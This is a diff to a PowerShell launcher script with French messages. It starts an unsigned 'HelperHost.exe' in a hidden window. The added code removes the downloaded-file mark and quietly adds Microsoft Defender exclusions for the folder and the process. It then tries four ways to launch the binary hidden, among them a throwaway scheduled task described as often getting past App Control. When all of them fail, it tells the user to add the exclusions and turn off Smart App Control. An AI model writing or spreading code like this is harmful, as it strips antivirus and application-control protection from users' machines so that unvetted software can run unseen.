@@ -42,11 +42,22 @@ function Unblock-Quiet([string]$Path) {
   if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }
 }
 
+function Try-DefenderExclude([string]$Path, [string]$Exe) {
+  try {
+    $mp = Get-Command Add-MpPreference -ErrorAction SilentlyContinue
+    if (-not $mp) { return }
+    Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess (Split-Path $Exe -Leaf) -ErrorAction SilentlyContinue
+  } catch {}
+}
+
 function Start-Helper([string]$Helper, [string]$WorkDir) {
+  if (-not (Test-Path $Helper)) { throw "HelperHost manquant: $Helper" }
   Unblock-Quiet $Helper
   Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
+  Try-DefenderExclude $WorkDir $Helper
 
-  # 1) ProcessStartInfo (UseShellExecute)
+  # 1) ProcessStartInfo
   try {
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $Helper
@@ -54,33 +65,65 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
     $psi.UseShellExecute = $true
     [void][System.Diagnostics.Process]::Start($psi)
-    Start-Sleep -Milliseconds 500
+    Start-Sleep -Milliseconds 700
     if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
   } catch {}
 
-  # 2) cmd start /b (no Start-Process)
+  # 2) direct call
   try {
-    $p = Start-Process -FilePath "$env:SystemRoot\System32\cmd.exe" -PassThru -WindowStyle Hidden `
-      -ArgumentList '/c', ('start "" /b "' + $Helper + '"') -WorkingDirectory $WorkDir
-    Start-Sleep -Milliseconds 800
+    Push-Location $WorkDir
+    Start-Process -FilePath $Helper -WorkingDirectory $WorkDir -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Pop-Location
+    Start-Sleep -Milliseconds 700
+    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
+  } catch { try { Pop-Location } catch {} }
+
+  # 3) cmd start /b
+  try {
+    & "$env:SystemRoot\System32\cmd.exe" /c "cd /d `"$WorkDir`" && start `"`" /b `"$Helper`""
+    Start-Sleep -Milliseconds 900
     if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
   } catch {}
 
-  # 3) one-shot scheduled task (souvent passe App Control user)
+  # 4) scheduled task (heure future + WorkingDirectory)
   $tn = 'HelperHostBoot'
-  $tr = "`"$Helper`""
-  cmd /c "schtasks /Delete /TN $tn /F" | Out-Null
-  $create = cmd /c "schtasks /Create /TN $tn /TR $tr /SC ONCE /ST 00:00 /RL LIMITED /F"
-  cmd /c "schtasks /Run /TN $tn" | Out-Null
-  Start-Sleep -Seconds 2
-  cmd /c "schtasks /Delete /TN $tn /F" | Out-Null
-  if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
+  try {
+    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
+  } catch {}
+  try {
+    $action = New-ScheduledTaskAction -Execute $Helper -WorkingDirectory $WorkDir
+    $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(2))
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    Register-ScheduledTask -TaskName $tn -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+    Start-ScheduledTask -TaskName $tn -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 3
+    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
+    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
+  } catch {
+    $st = (Get-Date).AddMinutes(2).ToString('HH:mm')
+    & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
+    & schtasks.exe /Create /TN $tn /TR $Helper /SC ONCE /ST $st /RL LIMITED /F 2>$null | Out-Null
+    & schtasks.exe /Run /TN $tn 2>$null | Out-Null
+    Start-Sleep -Seconds 3
+    & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
+    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
+  }
 
   throw @"
-Windows a bloque HelperHost.exe (controle d'application / Smart App Control).
-Autorise le fichier ou ajoute une exclusion:
+Windows bloque HelperHost.exe (Smart App Control / controle d'application).
+Ce n'est PAS un bug du script: l'exe non signe est refuse.
+
+Fais ceci (PowerShell Admin), puis relance Connecter:
+
+  Add-MpPreference -ExclusionPath '$WorkDir'
+  Add-MpPreference -ExclusionProcess 'HelperHost.exe'
+
+Puis: Parametres Windows > Confidentialite et securite > Securite Windows
+  > Controle des applications et du navigateur > Smart App Control > Desactiver
+(souvent un redemarrage est requis)
+
+Fichier:
   $Helper
-Puis relance la commande Connecter.
 "@
 }
 
